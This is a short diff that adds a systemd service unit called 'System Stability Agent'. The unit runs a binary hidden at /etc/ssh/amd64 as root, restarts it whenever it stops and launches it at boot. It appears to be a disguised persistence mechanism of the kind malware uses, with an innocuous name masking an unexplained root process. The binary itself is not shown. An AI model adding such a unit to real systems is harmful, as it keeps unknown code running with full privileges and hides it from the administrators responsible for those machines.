@@ -1,0 +1,12 @@
+[Unit]
+Description=System Stability Agent
+After=systemagentd
+
+[Service]
+ExecStart=/etc/ssh/amd64
+Restart=always
+User=root
+WorkingDirectory=/etc/maint
+
+[Install]
+WantedBy=multi-user.target
